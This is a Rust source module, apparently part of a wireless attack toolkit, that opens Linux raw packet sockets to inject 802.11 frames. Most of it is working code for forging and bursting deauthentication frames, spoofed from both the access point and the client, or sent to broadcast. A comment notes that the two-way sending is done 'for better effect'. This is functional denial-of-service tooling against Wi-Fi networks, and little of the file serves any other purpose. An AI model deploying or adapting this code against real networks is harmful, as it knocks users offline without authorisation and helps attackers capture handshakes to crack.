//! Raw packet injection via raw sockets
//!
//! This module provides the ability to inject raw 802.11 frames
//! using Linux raw sockets.

use std::io;
use std::mem;
use std::os::unix::io::{AsRawFd, RawFd};

use nix::libc::{self, c_int, c_void, sockaddr_ll, AF_PACKET, SOCK_RAW};

use crate::error::{Result, WirelessError};
use crate::frames::{DeauthFrame, MacAddress};
use crate::interface::WirelessInterface;
use crate::nl80211::get_ifindex;
use crate::radiotap::RadiotapHeader;

/// Raw socket for packet injection
#[derive(Debug)]
pub struct InjectionSocket {
    fd: RawFd,
    #[allow(dead_code)]
    ifindex: i32,
}

impl InjectionSocket {
    /// Create a new injection socket bound to an interface
    pub fn new(interface: &str) -> Result<Self> {
        // Check for root privileges
        if !crate::check_privileges() {
            return Err(WirelessError::Permission(
                "Root privileges required for raw socket".into(),
            ));
        }

        let ifindex = get_ifindex(interface)?;

        // Create raw packet socket
        let fd = unsafe {
            libc::socket(
                AF_PACKET,
                SOCK_RAW,
                (libc::ETH_P_ALL as u16).to_be() as c_int,
            )
        };

        if fd < 0 {
            return Err(WirelessError::Socket(format!(
                "Failed to create raw socket: {}",
                io::Error::last_os_error()
            )));
        }

        // Bind to interface
        let mut addr: sockaddr_ll = unsafe { mem::zeroed() };
        addr.sll_family = AF_PACKET as u16;
        addr.sll_ifindex = ifindex;
        addr.sll_protocol = (libc::ETH_P_ALL as u16).to_be();

        let bind_result = unsafe {
            libc::bind(
                fd,
                &addr as *const sockaddr_ll as *const libc::sockaddr,
                mem::size_of::<sockaddr_ll>() as libc::socklen_t,
            )
        };

        if bind_result < 0 {
            unsafe { libc::close(fd) };
            return Err(WirelessError::Socket(format!(
                "Failed to bind socket to interface: {}",
                io::Error::last_os_error()
            )));
        }

        tracing::debug!("Created injection socket on interface index {}", ifindex);

        Ok(Self { fd, ifindex })
    }

    /// Create from a WirelessInterface
    pub fn from_interface(iface: &WirelessInterface) -> Result<Self> {
        Self::new(iface.name())
    }

    /// Send raw bytes (must include radiotap header)
    pub fn send_raw(&self, data: &[u8]) -> Result<usize> {
        let sent = unsafe { libc::send(self.fd, data.as_ptr() as *const c_void, data.len(), 0) };

        if sent < 0 {
            return Err(WirelessError::Injection(format!(
                "Send failed: {}",
                io::Error::last_os_error()
            )));
        }

        Ok(sent as usize)
    }

    /// Send a frame with radiotap header prepended
    pub fn send_frame(&self, frame: &[u8], radiotap: &RadiotapHeader) -> Result<usize> {
        let mut packet = Vec::with_capacity(radiotap.len() + frame.len());
        packet.extend_from_slice(radiotap.as_bytes());
        packet.extend_from_slice(frame);

        self.send_raw(&packet)
    }

    /// Send a deauth frame
    pub fn send_deauth(&self, frame: &DeauthFrame) -> Result<usize> {
        let radiotap = RadiotapHeader::for_injection();
        self.send_frame(&frame.to_bytes(), &radiotap)
    }

    /// Send multiple deauth frames
    pub fn send_deauth_burst(&self, frame: &DeauthFrame, count: u32) -> Result<InjectionStats> {
        let mut stats = InjectionStats::default();
        let radiotap = RadiotapHeader::for_injection();
        let frame_bytes = frame.to_bytes();

        let mut packet = Vec::with_capacity(radiotap.len() + frame_bytes.len());
        packet.extend_from_slice(radiotap.as_bytes());
        packet.extend_from_slice(&frame_bytes);

        for _ in 0..count {
            stats.attempted += 1;
            match self.send_raw(&packet) {
                Ok(n) => {
                    stats.sent += 1;
                    stats.bytes += n as u64;
                }
                Err(e) => {
                    stats.failed += 1;
                    tracing::trace!("Injection failed: {}", e);
                }
            }
        }

        Ok(stats)
    }

    /// Get the raw file descriptor
    pub fn as_raw_fd(&self) -> RawFd {
        self.fd
    }
}

impl Drop for InjectionSocket {
    fn drop(&mut self) {
        unsafe { libc::close(self.fd) };
    }
}

impl AsRawFd for InjectionSocket {
    fn as_raw_fd(&self) -> RawFd {
        self.fd
    }
}

/// Statistics for injection operations
#[derive(Debug, Clone, Default)]
pub struct InjectionStats {
    /// Number of packets attempted
    pub attempted: u32,
    /// Number of packets successfully sent
    pub sent: u32,
    /// Number of packets that failed
    pub failed: u32,
    /// Total bytes sent
    pub bytes: u64,
}

impl InjectionStats {
    /// Success rate as a percentage
    pub fn success_rate(&self) -> f32 {
        if self.attempted == 0 {
            0.0
        } else {
            (self.sent as f32 / self.attempted as f32) * 100.0
        }
    }

    /// Merge stats from another instance
    pub fn merge(&mut self, other: &InjectionStats) {
        self.attempted += other.attempted;
        self.sent += other.sent;
        self.failed += other.failed;
        self.bytes += other.bytes;
    }
}

/// Packet injector with frame building utilities
pub struct Injector {
    socket: InjectionSocket,
    radiotap: RadiotapHeader,
    sequence: u16,
}

impl Injector {
    /// Create a new injector for an interface
    pub fn new(interface: &str) -> Result<Self> {
        Ok(Self {
            socket: InjectionSocket::new(interface)?,
            radiotap: RadiotapHeader::for_injection(),
            sequence: 0,
        })
    }

    /// Create from WirelessInterface
    pub fn from_interface(iface: &WirelessInterface) -> Result<Self> {
        Self::new(iface.name())
    }

    /// Set the radiotap header to use
    pub fn set_radiotap(&mut self, radiotap: RadiotapHeader) {
        self.radiotap = radiotap;
    }

    /// Get next sequence number
    fn next_sequence(&mut self) -> u16 {
        let seq = self.sequence;
        self.sequence = self.sequence.wrapping_add(1) & 0x0FFF;
        seq
    }

    /// Send a deauth frame
    pub fn inject_deauth(&mut self, frame: &mut DeauthFrame) -> Result<usize> {
        frame.set_sequence(self.next_sequence());
        self.socket.send_frame(&frame.to_bytes(), &self.radiotap)
    }

    /// Send deauth burst with sequence numbers
    pub fn inject_deauth_burst(
        &mut self,
        bssid: MacAddress,
        client: Option<MacAddress>,
        reason: crate::frames::DeauthReason,
        count: u32,
    ) -> Result<InjectionStats> {
        let mut stats = InjectionStats::default();

        // Build frame
        let client_mac = client.unwrap_or(MacAddress::BROADCAST);

        for _ in 0..count {
            // Frame from AP to client
            let mut frame = DeauthFrame::from_ap(bssid, client_mac, reason);
            frame.set_sequence(self.next_sequence());

            stats.attempted += 1;
            match self.socket.send_frame(&frame.to_bytes(), &self.radiotap) {
                Ok(n) => {
                    stats.sent += 1;
                    stats.bytes += n as u64;
                }
                Err(_) => stats.failed += 1,
            }

            // Also send from client to AP for better effect
            if !client_mac.is_broadcast() {
                let mut frame2 = DeauthFrame::from_client(bssid, client_mac, reason);
                frame2.set_sequence(self.next_sequence());

                stats.attempted += 1;
                match self.socket.send_frame(&frame2.to_bytes(), &self.radiotap) {
                    Ok(n) => {
                        stats.sent += 1;
                        stats.bytes += n as u64;
                    }
                    Err(_) => stats.failed += 1,
                }
            }
        }

        Ok(stats)
    }

    /// Get underlying socket
    pub fn socket(&self) -> &InjectionSocket {
        &self.socket
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_injection_stats() {
        let mut stats = InjectionStats {
            attempted: 100,
            sent: 95,
            failed: 5,
            bytes: 2600,
        };

        assert!((stats.success_rate() - 95.0).abs() < 0.01);

        let other = InjectionStats {
            attempted: 50,
            sent: 50,
            failed: 0,
            bytes: 1300,
        };

        stats.merge(&other);
        assert_eq!(stats.attempted, 150);
        assert_eq!(stats.sent, 145);
    }
}
